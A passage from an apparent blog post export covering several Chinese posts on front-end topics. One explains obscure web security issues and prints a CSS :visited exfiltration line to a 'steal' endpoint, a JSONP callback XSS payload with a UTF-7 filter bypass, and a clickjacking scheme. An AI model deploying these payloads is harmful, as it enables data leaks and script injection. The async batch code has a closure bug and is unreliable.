我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。","tags":[{"name":"html5","slug":"html5","permalink":"/tags/html5/"},{"name":"前端","slug":"前端","permalink":"/tags/前端/"},{"name":"性能","slug":"性能","permalink":"/tags/性能/"}]},{"title":"一个文件夹的自我介绍","date":"2014-07-25T00:52:00.000Z","path":"2014/07/25/folder-to-tree/","text":"#folder2tree 用字符展示文件夹结构 前言 Before:如何介绍一个文件夹，简直纠结。 要么图片，如果在截图前，你真的愿意，一层一层一层的剥开我的心。你会鼻酸你会流泪；要么靠说，那么你可能得这么说：从前，有一个文件夹，文件夹里有两张图片；大图片在跟小图片讲故事…讲个什么故事额 因而，用纯字符描述文件夹的小工具必须得有呀。github here. 使用 Usage:123456789101112131415161718192021222324252627282930313233343536@param &#123;Dom&#125; 父级dom节点 @param &#123;Array&#125; 描述文件夹层级关系对象folder2tree.init(document.getElementById(\"ctn\"), [ &#123; \"img\" : [ \"sprite.png\", \"bg.png\" ] &#125;,&#123; \"js\": [&#123; \"common\": [ \"jquery.js\",&#123; \"highcharts\": [&#123; \"modules\": [\"exporting.js\"] &#125;, \"highcharts.js\" ]&#125; ] &#125;,&#123; \"index\": [ \"mian.js\",&#123; \"modules\": [\"mod.video.js\"] &#125; ] &#125;] &#125;,&#123; \"css\": [ \"base.css\", \"index-main.css\", \"index-video.css\" ] &#125;, \"index.html\", \"favicon.ico\"]); 展示 Show:1234567891011121314151617181920├─img│ ├─sprite.png│ └─bg.png├─js│ ├─common│ │ ├─jquery.js│ │ └─highcharts│ │ ├─modules│ │ │ └─exporting.js│ │ └─highcharts.js│ └─index│ ├─mian.js│ └─modules│ └─mod.video.js├─css│ ├─base.css│ ├─index-main.css│ └─index-video.css├─index.html└─favicon.ico","tags":[{"name":"js","slug":"js","permalink":"/tags/js/"},{"name":"工具","slug":"工具","permalink":"/tags/工具/"}]},{"title":"北京 北京","date":"2014-06-01T15:52:00.000Z","path":"2014/06/01/北京 北京/","text":"当我走在这里的每一条街道我的心似乎从来都不能平静除了发动机的轰鸣和电气之音我似乎听到了他烛骨般的心跳 我在这里欢笑 我在这里哭泣我在这里活着 也在这儿死去我在这里祈祷 我在这里迷惘我在这里寻找 在这里失去北京 北京 咖啡馆与广场有三个街区就像霓虹灯到月亮的距离人们在挣扎中相互告慰和拥抱寻找着追逐着奄奄一息的碎梦 我们在这欢笑 我们在这哭泣我们在这活着 也在这儿死去我们在这祈祷 我们在这迷惘我们在这寻找 也在这儿失去北京 北京 如果有一天我不得不离去我希望人们把我埋在这里在这儿我能感觉到我的存在在这有太多让我眷恋的东西 我在这里欢笑 我在这里哭泣我在这里活着 也在这儿死去我在这里祈祷 我在这里迷惘我在这里寻找 也在这儿失去北京 北京 北京 北京 「“晚安 北京 / 晚安 所有未眠的人们……”旧日的歌声铭刻在记忆里《北京 北京》作为一个传承在这个巨大的城市 有人哭泣 有人欢笑汪峰站在这个城市的中央 继续歌唱……」","tags":[{"name":"随笔","slug":"随笔","permalink":"/tags/随笔/"}]},{"title":"前端安全冷门知识杂谈","date":"2014-05-27T15:52:00.000Z","path":"2014/05/27/safety-point-of-view-from-front-end/","text":"###零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节： 盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学 资料略多，文章较长，请自备瓜子… ###一、盗取无法用js读写的Cookie为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。12setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookiesetcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启 我们还是可以通过一些服务器上的漏洞去获取它们。 ####2.1) 调试信息泄露比较经典的是PHP的phpinfo文件：如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。访问phpinfo.php，将看到：其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。 ####2.2) Apache 2.2.x版本请求头超长泄露Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。 ###三、删不掉的本地存储如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案： Cookie - 是最常见的方式，key-value 模式UserData - IE自己的本地存储，key-value 模式localStorage - HTML5 新增的本地存储，key-value 模式local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器 除去这些，我还收集了一些比较“偏门”的存储方案： Silverlight的IsolatedStorage - 类似HTML5 localStoragePNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）window.name，本质就是一个DOM 存储，并不存在本地。 老外Samy Kamkar用半天开发了一个JavaScript API：evercookie。该API利用了上面的全部存储手段，将“永不丢失你的cookie”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。 ###四、函数覆写监听上报覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：搞跨站的人总习惯用alert来确认是否已成功跨站，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。12345678910function log(s) &#123; var img = new Image(); img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);&#125;var _alert = alert;window.alert = function(s) &#123; log(alert.caller); _alert(s);&#125; 如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《浅谈javascript函数劫持》。 ###五、内存Cookie与硬盘Cookie内存Cookie - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁硬盘Cookie - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期 我们很容易得出结论：内存Cookie更安全。因此，某些站点会把敏感信息放到内存Cookie里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。 因此，这里有两个关注点： 敏感信息还是不要放Cookie里，即使是内存Cookie； 服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。 ###六、CSS带来的点击量泄露在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。试想这是一个导航栏组件，html代码是这样的：123&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt; 你忽略掉的css写成这样：123#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125; 我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的点击数据量就暴露给第三方了！当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…HTML5提供伪类::selection，当指定对象区域被选择时，就会触发。其原理跟上面类似。 ###七、JSONP回调函数与UTF-7编码 ####7.1) 基本原理在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：cgi-bin/get_jsonp?id=123&amp;call_back=some_function返回数据格式为：some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。请求：cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;返回：&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？ ####7.2) IE解析UTF-7漏洞比较简单的过滤方法，是过滤&lt;&gt;字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析（IE7后续版本已发布补丁修复）。在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4这时候巧妙的躲开了&lt;&gt;过滤，而返回：+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。 ###八、过滤与代码混淆过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：jsfuck。站名如其名，满满的恶意…它可以仅仅用6个字符：[]()!+去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句alert(1)编码成了3009个字符，并执行成功：所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。 ###九、心理学与社会工程学有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例： ####9.1）诱导触发拖拽事件比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？很简单，添加一张图片：注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。 ####9.2) 传说中的QQ空间“传染病毒”步骤是这样的： A(始作俑者)发布了一条说说：这个网站很好玩，快来试试吧~ http://xxx.xxx A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！） 一传十十传百，越传越广… 但真实的情况跟CSRF没一点关系。玄妙在于：好友们打开链接后干了什么事情？这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说… 有人会问，这不是CSRF吗？还真不是。做法却很简单：“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是点击了iframe中的转发按钮。真是令人万万没想到。 以上。End. 5.27 by litten.","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"}]},{"title":"小朋友，跟你谈谈印象派","date":"2014-03-30T15:52:00.000Z","path":"2014/03/30/volunteer-activities/","text":"今天去陪留守的小朋友一起画画，这是一个义工志愿者活动。 经游戏分组，我负责带5位小朋友，正巧是三胞胎和双胞胎。杜晓凡、杜晓平、杜德俊（水饺）三兄妹，文殊琪、文殊曼（馒头）姐妹。混淆了好几次谁是馒头，谁是水饺后，我已经记住你们的名字了。小朋友们都不认生，晓凡一开始就问我好多问题。比如这些： 晓凡：哥哥你几年级？我：我已经上班了。晓凡：不会吧？看不出来哎。你在哪里上班？我：腾讯。晓凡：原来是挺随便找了个公司我：……对 水饺是个小胖子，有很多个花名。其中一个叫做豆子，但现在不许我们这么叫他，因为他说自己已经长大了，豆子太小就改名成水饺了。水饺热衷于怪兽图…他的太阳都是有手脚的。他用短短时间画了两张“百兽图”，还会问我：哥哥我要你手机，你有天天酷跑吗，我要画里面有个怪兽。 馒头是我带的小朋友里面绘画思维最好的一位。她想着画羊，还会借我的手机，自己去搜索图片去模仿。很聪明的小女孩。 妹妹殊琪却比较胆小，总怕出错，跟姐姐完全不一样。她喜欢让我帮忙出谋划策，却不敢自己大胆去涂画，直到最后她还没敢涂色。 晓平比晓凡小5岁，是个扎着双马尾很可爱的小朋友，有需要也会主动问我，但从不要求我插手，只凭自己感觉去画画，这点超赞。 雅典娜小朋友的作品是在场很少的，能传达出意义的画作。看不出是个二年级学生的作品。聪慧美丽的小女孩人如其名。 讲解印象派水彩的时候，老师问，谁能看出这幅画与前面的画的区别。我脑中尽是高深详细的“印象派”词义描述，有不确定的点，再拿出手机百度一翻，最后成竹在胸，了然于心。 后面一小朋友大声喊：看不清！老师：对的，这就是印象派的特征。 有时我们顾于去搜寻最客观的解释，企图用权威的释义去描述事务，却不能像小朋友一样，忠实于自己的眼睛。也许，他们真的比我们懂更多所谓的“印象派”，不是么？","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"},{"name":"生活","slug":"生活","permalink":"/tags/生活/"}]},{"title":"instagram图片拉取小经验","date":"2014-03-03T14:52:00.000Z","path":"2014/03/03/instagram-api-ex/","text":"最近喜欢上了instagram，分享一下获取照片的经验。 ###一、三“步”曲instagram开放了API，授权遵循Oauth2.0协议。 ####1、注册client id到管理客户端页面，选择“注册新客户端”。这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面：按照字面意思填写完毕，client id就注册完毕了。 ####2、用client_id去换取token在浏览器中请求：1https://instagram.com/oauth/authorize/?client_id=&#123;CLIENT_ID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=token 花括号里面的值，对应上一步最终得到的client_id和自己设定的redirect_uri。请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。 ####3、用token去调用API 拿到token，就等于拿到仓库的钥匙了！赶紧试着用token调用api查看自己的图片吧：1https://api.instagram.com/v1/users/&#123;USER_ID&#125;/media/recent/?access_token=&#123;TOKEN&#125; 这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。结果错了。 后来发现有这个的网站：lookup-user-id，通过此业界良心，成功获取到user_id，摆平了上面的请求。 ###二、参考 更多功能可参考api文档 如果想了解Oauth授权，点此 ###三、再说两句图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。 事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。 不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。 “你想做什么，你就会进入什么样的圈子”，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。 the end.litten 2014.3.3","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"经验","slug":"经验","permalink":"/tags/经验/"},{"name":"产品","slug":"产品","permalink":"/tags/产品/"}]},{"title":"像素级细节：移动端1px border的实现","date":"2014-02-22T12:11:00.000Z","path":"2014/02/22/thinner-than-1px-border/","text":"请记住，每个尽责的设计师都是处女座… 这里…没有黑处女座的意思，只是想借题发挥，并由衷的跪倒在强大的“像素眼”之下。 ###一、你是我的眼 什么是像素眼？就是那些个神奇的存在，他们用余光瞄了你一眼，然后跟你说：我发现啊，你左边眉毛比右边眉毛高了1像素，麻烦你调整下… 在腾讯，我身边的许多设计同学都有这样的眼睛。他们会把细节做到极致，也会因为频繁的修改，把你开发的心情搞得一团糟。但你得承认，他们是对的。 最近在做移动端web开发，按着设计图，toby已在我旁边核对修改了两个多小时。当我觉得已经万事大吉时，toby跟我说，还是觉得不太对——边框好像有点粗？ 当时我就傻眼了，因为这已是最细的边框，电脑上清楚的显示，我已经设置了1px的border。于是我去解释，并建议更换个色值，让边框至少“看起来”更细。而toby却不接受，按他给我的说法是：这border看起来不性感… 原来这世界的审美观，都是以瘦为美，从女人到一根线？于是乎，为了寻找性感的border，搜集一堆资料后还真找到了方案： 父元素设置：scale(0.5,0.5) 子元素设置：scale(2,2) 还原缩放，origin都是基于左上角（0,0）/left top 这样父元素的border其实被缩放了，无疑更细。 ###二、通用方案 用一个css类去为block元素添加更细的border1234567891011121314151617.border-1px&#123; position: relative; &amp;:before, &amp;:after&#123; border-top: 1px solid #c8c7cc; content: ' '; display: block; width: 100%; position: absolute; left: 0; &#125; &amp;:before&#123; top: 0; &#125; &amp;:after&#123; bottom: 0; &#125;&#125; 适应移动设备：123456789101112131415161718192021@media (-webkit-min-device-pixel-ratio:1.5), (min-device-pixel-ratio: 1.5)&#123; .border-1px&#123; &amp;::after, &amp;::before&#123; -webkit-transform: scaleY(.7); -webkit-transform-origin: 0 0; transform: scaleY(.7); &#125; &amp;::after&#123; -webkit-transform-origin: left bottom; &#125; &#125;&#125;@media (-webkit-min-device-pixel-ratio:2), (min-device-pixel-ratio: 2)&#123; .border-1px&#123; &amp;::after, &amp;::before&#123; -webkit-transform: scaleY(.5); transform: scaleY(.5); &#125; &#125;&#125; ###三、来个对比 比如，之前我学日语时，自己搞起了个app，这是50音列表界面，可以明显的看出区别：上图是原生方案，下图是…性感方案 源码小demo，注意要在手机上才能看到效果：demo。 The End.——litten 2.22 “写轮眼？弱爆了啊 ←_←”","tags":[{"name":"html5","slug":"html5","permalink":"/tags/html5/"},{"name":"css3","slug":"css3","permalink":"/tags/css3/"}]},{"title":"pjax: 当ajax遇上pushState","date":"2014-02-12T00:55:00.000Z","path":"2014/02/12/about-pjax/","text":"var pjax = pushState + ajax;小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片… ##一、简介pushState是html5中提供的方法，用以 无刷新的更新浏览器地址栏； 如其名称，将新地址push到历史堆栈中 用法：pushState(data, title ,url) data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。 ##二、ajax的纠结历史一切可以从ajax最擅长的事情说起。ajax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。 因而，ajax可以无刷新改变页面内容，却无法改变页面的url。 ####历史问题1 - 如何操控历史 当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：体育 - 篮球 -nba -马刺队 - 邓肯当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法： 刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据； 支持了历史 这样的方式貌似比较完善，其实不然。 ####历史问题2 - 对搜索引擎不友好 最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：#!xxx这样hash的url，google也去爬取。称之为hash bang（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。 事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。 ##三、pjax带来的价值除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。 ajax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步： 一个url对应一套数据，有利于SEO； 更改数据和url时，只是局部刷新，带来较好的用户体验； 兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）； 刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便； 后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获） ##四、注意事项 然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项： 服务器端增加额外处理逻辑服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应1234567Accept:text/html, */*; q=0.01Accept-Encoding:gzip,deflate,sdchConnection:keep-aliveHost:qianduannotes.duapp.comUser-Agent:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36X-Requested-With:XMLHttpRequestX-PJAX:true 比如请求头部可以设定一个X-PAJX:true，用以通知服务器。 浏览器兼容假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址： 12345678$.support.pjax = window.history &amp;&amp; window.history.pushState// Fallbackif ( !$.support.pjax ) &#123; $.pjax = function( options ) &#123; window.location = $.isFunction(options.url) ? options.url() : options.url &#125; $.fn.pjax = function() &#123; return this &#125;&#125; 本地存储机制无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。 ##五、参考资料jquery-pjaxwelefen封装的pjax","tags":[{"name":"js","slug":"js","permalink":"/tags/js/"},{"name":"html5","slug":"html5","permalink":"/tags/html5/"}]},{"title":"把自己锁在杯子里","date":"2014-01-10T12:30:00.000Z","path":"2014/01/10/lock-me-in-a-cup/","text":"杯子里的一条鱼你可担心会有天外扑来的龙卷风把你的魂魄摄出领地？泳池温热，心脏被灌了风，开垦者默言而卧涛声隐隐作痛若是一壶热酒浇下，由西向东你是缱绻醉倒？还是鱼跃入梦？ —— 01.10","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"},{"name":"药别停","slug":"药别停","permalink":"/tags/药别停/"}]},{"title":"如何成功做出一款没人使用的产品","date":"2013-12-20T03:55:00.000Z","path":"2013/12/20/no-one-used-pro/","text":"1、 logo金属化，而且是重金属。给人朋克风范，炫酷感觉。第一眼就有被闪电晃过灵魂的错觉，这样子就对了。 2、无限循环的播放背景音乐。不需要设置关闭，你只需要坚持自我。 3、注册的界面，输入密码的文字框一般有两个：填密码和确认密码的。我们可以做5个，让他们再再确认，这样可以体现你无微不至的情怀。情怀你懂吗？ 4、注册新用户名的时，先把数据检测一下。并提示：你确定用户名不带火星文吗？用户点了否，再提示：那特殊符号也不用❤★※←＆♂吗？如果用户还是点了否，你要做出这样的符号表情来表示不理解：~&gt;_&lt;~ 5、要有“意见反馈”的功能，但是，无论用户提交了什么有价值的意见，甚至用户觉得这建议太美好了以至于自己都high了起来。一律不回。 6、给用户黑名单里面的人都发个消息：“TA给你加了黑名单我偷偷告诉你，你别告诉TA哦”。 7、安装程序时，要勾上“同意以上条款，并背诵全文”。 8、所有文案只写一半，刚引起用户兴趣就戛然而止，记住你是风一般的产品经理。 The End.","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"},{"name":"药别停","slug":"药别停","permalink":"/tags/药别停/"}]},{"title":"谈谈人为何会沉迷游戏？","date":"2013-11-07T10:55:00.000Z","path":"2013/11/07/something-about-immersion/","text":"为何人会沉迷？这个模型很有意思。 当人在“得到技能提升”和“获得挑战后的成就感”这两者中得到一定平衡时，就会陷入沉迷，这个平衡的范围称之为“心流”（flow）。人处在心流状态下，就会陷入沉迷。 ##“lol，那是小学生玩的” 试想一局dota为何引人专注？完成击杀或最后胜利时你会获得挑战后的成就感，而无疑你的技术又在游戏中越发娴熟。两者共同作用，人陷其中，几局dota就让一天过去了。事实上，任何成功的游戏都是这样，不会难度超大（否则人会焦虑），也不会让人得不到技能和熟练度的提升（否则人会无聊）。这也解释了为何部分dota玩家谈起lol时，会不屑的说：“那是小学生玩的”。因为dota和lol属同类型游戏，一个熟练的dota玩家的技能维度已经较高，自然在转移到lol后得不到太大的提升，因此偏离了心流通道，使人觉得无趣。如何能合适引导这批玩家呢？唯有做好差异化。只要有不同的玩法和细节，就能让人形成新的技能增长点。这点我认为lol还是做得很不错的。 再说下11平台为何会打败老牌的竞技平台，独树一帜。自然有人说，是因为匹配系统。是的，更深层次的说，是它适配了玩家的挑战水平。在浩方的时候，小白被高手虐得体无完肤的故事喜闻乐见。无疑，对任何人而言，挑战度不合适会给人带来焦虑和恐惧。匹配系统做的事情，其实是把挑战维度稳定在心流通道范围里。 ##赌博，最伟大的游戏 细分起来，人的沉迷场景其实有两种：感性和认知。举个栗子，迪士尼乐园的过山车，克服心理恐惧是个挑战，而坐过几次后不再那么害怕属于技能增长，但两者存在于感性层面，是精神的主观感受；百家讲坛，许多人喜欢看，讲的东西我们可能压根不懂，可谓之挑战，而知识的渗透关系到技能，但此过程是跟过山车不一样的，人有学到东西，有认知层面的提升。 再细究一下，我们不会每周都去玩过山车，也不会说百家讲坛一集不落的都看。因为他们还不足以让人沉迷。真正能让人沉迷的，必须是“感性”和“认知”两个维度高度统一的场景。facebook上常年居首的第三方应用是德州扑克，国内用户量最大的是QQ游戏大厅，小城镇六合彩屡禁不止，打麻将俨然已冲出国门走向世界。我想说的是——赌博，是最伟大的游戏之一。无论是真实的或变相的，无论历史还是现在，不同年龄段的人都会沉浸其中。源于它扼紧了人性的弱点，又是感性和认知的高度统一。 举斗地主为例子，认知层面就是你牌技的增长，一个新手是很难对付牌场老手的。通过反复的练习，人可以对形势做出更正确的判断。有个朋友就告诉过我，他觉得斗地主是一门艺术。艺术一词，可能过于高贵，但足以概况了人对掌握了更高级技术所带来的满足感。那么感性层面怎么体现呢，就在于游戏的随机性。你给我一副绝世好牌，即使我再菜鸟也一定能赢一个高手！这跟技术无关，凭着的都是运气与人品，就在爆发的一刹那给你过山车的快感。人有了期待，就有沉浸与等待的动力，而真正赌博中跟金钱挂钩，又无疑更是个感性维度高功率的放大器。 人的一生都在沉迷赌博，事实上，从你小时候玩玻璃弹珠时就开始了。 ##何为接地气？ 琴棋书画，作为衡量文人墨客或大家闺秀的修养标准，古之已有。而真正在能融入生活的，不是登大雅之堂的钢琴，不是分级分段的围棋，更不是象征艺术，被层层装裱的书法与油画，取而代之，是吉他，扑克，网络小说，畅销书，还有动漫。有人概况谓之接地气。 快餐文化的流行，是因为它不太需要思考，不太触及上面提到的“认知”层面。信息流穿墙而过，径直流到你的面前，一耳进一耳出有何不可，图的就是一个爽快！ 所以“接地气”其实是一种偏“感性”而弃“认知”的沉浸形态。也许又会有这样的疑问，弃认知的形态岂不是不能成为“伟大的游戏”？是的，这样的形态不需要也不可能使人100%沉浸，但它的厉害之处在于持续性。比如，大家不会一遍一遍咬文嚼字像品味红楼梦一样，去阅读一本网络小说。因为它不足已让你得到技能认知方面的满足，但是，你看完了它，说不定又会去看另外的网络小说，因为另外一本，可能会给你新的感官体验。 为何中国网游层出不穷，但却缺乏精品？因为游戏公司一旦赚钱，不会把过多基金投入到二次开发，反正，你们很快就会厌烦。不如来开发新鲜而老套的网游，不是么？ The End.","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"},{"name":"产品","slug":"产品","permalink":"/tags/产品/"}]},{"title":"统一处理异步的js回调","date":"2013-10-06T02:55:00.000Z","path":"2013/10/06/handling-asynchronous-js/","text":"js编程时经常会用到异步处理，而异步会带了所谓的并发问题。比如，你需要向服务器发出多个ajax请求，然后在返回所有结果后做进一步处理，同时要显示动画。因此我们需要用到以下的方案。 ###【定义函数】定义Batch函数。参数为函数组成的数组functions，这里面的函数将稍后执行，以及这些函数完成后的回调completionHandler。1234function Batch(functions, completionHandler) &#123; this._functions = functions; this._completionHandler = completionHandler;&#125; ###【启动请求】用this._remaining来记录未执行的函数量，然后执行各个函数。123456789Batch.prototype.execute = function execute() &#123; var i; var functions = this._functions; var length = this._remaining = functions.length; this._results = []; for (i = 0; i &lt; length; i += 1) &#123; functions[i](this); &#125;&#125;; ###【让Batch知道函数完成】用this._results来记录执行结果，当this._remaining为0时，表示所有函数已执行完毕。123456789Batch.prototype.done = function done(result) &#123; this._remaining -= 1; if (typeof(result) !== 'undefined') &#123; this._results.push(result); &#125; if (this._remaining === 0) &#123; this._completionHandler(this._results); &#125;&#125;; 到这里，就完成了Batch这个函数的简单功能了。 ###【使用】将Batch应用到实际上。1234567891011121314151617181920212223242526272829var urls = [ '/api/gists/1000', '/api/gists/1001', '/api/gists/1002', '/api/gists/1003', '/api/gists/1004', // ... '/api/gists/1337', // etc...];var i;var length = urls.length;var batchFunctions = [];// 创建需要被batch执行的函数数组for (i = 0; i &lt; length; i += 1) &#123; batchFunctions.push(function (batch) &#123; $.ajax.get(urls[i], function (response) &#123; batch.done(response); &#125;); &#125;);&#125;var myBatch = new Batch(batchFunctions, function (results) &#123; //返回各个函数的结果数组&#125;);myBatch.execute(); // 开始执行 这样的方案其实是参考了“观察者”模式。相关源码推荐nodeJs的Async.js库。 THE 